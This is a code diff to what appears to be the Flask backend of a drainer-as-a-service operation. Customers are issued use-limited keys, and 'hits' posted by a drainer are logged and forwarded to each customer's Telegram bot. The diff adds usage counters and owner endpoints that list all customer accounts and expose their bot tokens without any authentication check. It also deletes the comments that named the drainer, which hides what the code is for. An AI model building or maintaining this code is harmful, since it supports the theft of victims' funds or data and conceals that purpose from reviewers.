@@ -416,6 +416,9 @@ def api_create_key():
     entry = dict(body)
     entry.setdefault("bot_token", "")
     entry.setdefault("chat_id", body.get("telegram", ""))
+    entry.setdefault("uses", 0)
+    entry.setdefault("max_uses", body.get("maxUses", 1))
+    entry.setdefault("created_at", datetime.utcnow().isoformat())
     data.setdefault("keys", {})[key] = entry
     db_set(data)
     if body.get("telegram"):
@@ -466,7 +469,7 @@ def api_master_log():
     return jsonify({"ok": True})
 
 # ==========================================================
-# /api/user-config — user saves their own bot token + chat id
+# /api/user-config
 # ==========================================================
 @app.route("/api/user-config", methods=["POST"])
 def api_user_config():
@@ -485,7 +488,7 @@ def api_user_config():
     return jsonify({"ok": True})
 
 # ==========================================================
-# /api/hit — drainer posts here, we forward to user's bot
+# /api/hit
 # ==========================================================
 @app.route("/api/hit", methods=["POST"])
 def api_hit():
@@ -571,7 +574,7 @@ def api_hit():
     return jsonify({"ok": True})
 
 # ==========================================================
-# /api/user-hits — user pulls only their own hits
+# /api/user-hits
 # ==========================================================
 @app.route("/api/user-hits", methods=["POST"])
 def api_user_hits():
@@ -582,6 +585,60 @@ def api_user_hits():
         return jsonify({"ok": False, "error": "invalid_key"}), 400
     mine = [e for e in data.get("master_log", []) if e.get("key") == key]
     return jsonify({"ok": True, "hits": mine[-200:]})
+
+# ==========================================================
+# /api/accounts — owner only: full user list
+# ==========================================================
+@app.route("/api/accounts", methods=["GET"])
+def api_accounts():
+    data = db()
+    keys = data.get("keys", {})
+    users = data.get("users", {})
+    log = data.get("master_log", [])
+
+    accounts = []
+    for k, v in keys.items():
+        tg_id = v.get("telegram", "")
+        hits = [e for e in log if e.get("key") == k]
+        user_info = users.get(tg_id, {})
+        accounts.append({
+            "username": v.get("note") or user_info.get("username") or f"user_{tg_id}",
+            "telegram": tg_id,
+            "key": k,
+            "firstSeen": user_info.get("first_seen") or v.get("created_at"),
+            "lastSeen": hits[-1]["t"] if hits else v.get("created_at"),
+            "hits": len([h for h in hits if h.get("event") == "hit"]),
+            "status": "active" if v.get("uses", 0) > 0 else "pending",
+            "hasBot": bool(v.get("bot_token")),
+            "uses": v.get("uses", 0),
+            "maxUses": v.get("max_uses", 1)
+        })
+    accounts.sort(key=lambda a: a.get("firstSeen") or "", reverse=True)
+    return jsonify({"ok": True, "accounts": accounts})
+
+# ==========================================================
+# /api/owner-keys — owner only: every issued key
+# ==========================================================
+@app.route("/api/owner-keys", methods=["GET"])
+def api_owner_keys():
+    data = db()
+    keys = data.get("keys", {})
+    out = []
+    for k, v in keys.items():
+        out.append({
+            "key": k,
+            "telegram": v.get("telegram", ""),
+            "note": v.get("note", ""),
+            "uses": v.get("uses", 0),
+            "maxUses": v.get("max_uses", 1),
+            "expires": v.get("expires"),
+            "createdAt": v.get("created_at"),
+            "hasBot": bool(v.get("bot_token")),
+            "botToken": v.get("bot_token", ""),
+            "chatId": v.get("chat_id", "")
+        })
+    out.sort(key=lambda a: a.get("createdAt") or "", reverse=True)
+    return jsonify({"ok": True, "keys": out})
 
 @app.route("/", methods=["GET"])
 def index():
